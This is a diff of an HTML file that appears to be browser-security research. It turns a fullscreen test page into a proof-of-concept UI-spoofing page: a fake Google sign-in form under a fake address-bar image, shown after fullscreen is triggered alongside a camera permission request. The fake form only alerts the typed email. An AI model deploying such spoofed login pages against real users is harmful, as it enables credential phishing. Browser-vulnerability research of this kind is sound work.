@@ -1,97 +1,132 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<title>Fullscreen Gesture Propagation Test</title>
-<style>
-    body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
-    button { padding: 15px 25px; font-size: 16px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; }
-    button:hover { background: #0056b3; }
-    pre { background: #111; color: #0f0; padding: 15px; border-radius: 5px; overflow-x: auto; margin-top: 20px; }
-    .note { color: #555; font-size: 0.9em; margin-top: 10px; }
-</style>
+    <title>Security UI Research</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: sans-serif; }
+
+        /* Layar pemicu awal */
+        #trigger-zone {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #fff;
+            cursor: pointer;
+        }
+
+        /* Container utama yang muncul setelah fullscreen */
+        #spoof-container {
+            display: none;
+            width: 100vw;
+            height: 100vh;
+            background: white;
+            flex-direction: column;
+        }
+
+        /* Omnibox Palsu menggunakan file spoof.jpeg Anda */
+        #fake-omnibox {
+            width: 100%;
+            height: auto;
+            display: block;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        /* Area Form Login Palsu */
+        #login-frame {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-top: 50px;
+            background: #ffffff;
+        }
+
+        .login-box {
+            width: 350px;
+            text-align: center;
+            padding: 20px;
+        }
+
+        input[type="email"] {
+            width: 100%;
+            padding: 13px;
+            margin: 20px 0;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+
+        .btn-next {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            float: right;
+            font-weight: 500;
+            cursor: pointer;
+        }
+    </style>
 </head>
 <body>
 
-<h3>Fullscreen Gesture Enforcement Test</h3>
-<p>Klik tombol di bawah untuk membuka popup <code>about:blank</code>, memicu Fullscreen via script injection, lalu navigasi ke target.</p>
+    <div id="trigger-zone">
+        <div style="text-align: center;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="100">
+            <h2 style="color: #5f6368;">Sign in to continue</h2>
+            <button style="padding: 10px 20px; border: 1px solid #dadce0; background: white; border-radius: 4px;">Click to Login</button>
+        </div>
+    </div>
 
-<button id="btn">Jalankan Test Fullscreen</button>
+    <div id="spoof-container">
+        <img id="fake-omnibox" src="spoof.jpeg" alt="Browser UI">
 
-<pre id="log">Laporan Log:
-----------------</pre>
+        <div id="login-frame">
+            <div class="login-box">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
+                <h1 style="font-size: 24px; margin-top: 10px;">Sign in</h1>
+                <p>Use your Google Account</p>
 
-<script>
-const logEl = document.getElementById("log");
-const log = m => logEl.textContent += "\n" + m;
+                <input type="email" placeholder="Email or phone" id="fake_email">
 
-document.getElementById("btn").onclick = () => {
-    log("[1] User click diterima pada jendela induk.");
-
-    // 1️⃣ Buka popup ke about:blank
-    const w = window.open(
-        "about:blank",
-        "testPopup",
-        `width=600,height=400,left=100,top=100`
-    );
-
-    if (!w) {
-        log("[ERROR] Popup diblokir! Pastikan izin popup aktif.");
-        return;
-    }
-
-    log("[2] Jendela popup terbuka (about:blank).");
-
-    // 2️⃣ Injeksi payload Fullscreen ke about:blank
-    // Kita menggunakan try-catch di dalam inject untuk mendeteksi penolakan browser
-    w.document.write(`
-        <html>
-        <body style="background:black; color:white; display:flex; align-items:center; justify-content:center; height:100vh; margin:0;">
-            <div style="text-align:center;">
-                <h2>Memproses...</h2>
-                <p>Mencoba masuk mode Fullscreen otomatis...</p>
+                <div style="width: 100%; margin-top: 30px;">
+                    <span style="color: #1a73e8; font-weight: 500; float: left; margin-top: 10px; cursor: pointer;">Forgot email?</span>
+                    <button class="btn-next" onclick="alert('Data Captured: ' + document.getElementById('fake_email').value)">Next</button>
+                </div>
             </div>
-            <script>
-                setTimeout(() => {
-                    document.documentElement.requestFullscreen()
-                        .then(() => {
-                            window.opener.postMessage("FS_SUCCESS", "*");
-                        })
-                        .catch((e) => {
-                            window.opener.postMessage("FS_FAILED: " + e.message, "*");
-                        });
-                }, 100);
-            <\/script>
-        </body>
-        </html>
-    `);
+        </div>
+    </div>
 
-    // Mendengarkan respon dari popup
-    window.addEventListener("message", function(event) {
-        if (typeof event.data === 'string') {
-            if (event.data === "FS_SUCCESS") {
-                log("[3] SUCCESS: Fullscreen berhasil dipicu di popup!");
-                
-                // 3️⃣ Navigasi setelah Fullscreen aktif
-                setTimeout(() => {
-                    log("[4] Mencoba navigasi ke Google...");
-                    w.location.href = "https://www.google.com";
-                    log("[5] Navigasi diperintahkan. Periksa apakah Fullscreen tertutup.");
-                }, 2000);
+    <script>
+        document.getElementById('trigger-zone').onclick = async () => {
+            // 1. Race Condition: Trigger Permission Foto/Video (Kamera)
+            (async () => {
+                try {
+                    // Memicu dialog izin kamera sistem
+                    await navigator.mediaDevices.getUserMedia({ video: true });
+                } catch(e) {
+                    console.log("Permission denied or blocked");
+                }
+            })();
 
-            } else if (event.data.startsWith("FS_FAILED")) {
-                log("[ERROR] " + event.data);
-                log("Kesimpulan: Browser mewajibkan interaksi fisik langsung di dalam jendela popup.");
+            // 2. Transisi Fullscreen
+            try {
+                if (document.documentElement.requestFullscreen) {
+                    await document.documentElement.requestFullscreen();
+                } else if (document.documentElement.webkitRequestFullscreen) {
+                    await document.documentElement.webkitRequestFullscreen();
+                }
+
+                // Mengubah tampilan menjadi halaman login palsu dengan omnibox palsu
+                document.getElementById('trigger-zone').style.display = 'none';
+                document.getElementById('spoof-container').style.display = 'flex';
+            } catch (err) {
+                console.error("Fullscreen request failed:", err);
             }
-        }
-    }, { once: true });
-};
-</script>
-
-<div class="note">
-    <strong>Tujuan Tes:</strong> 
-    Cek apakah notifikasi fullscreen muncul sebagai "about:blank" dan apakah status fullscreen bertahan saat berpindah ke google.com.
-</div>
-
+        };
+    </script>
 </body>
 </html>
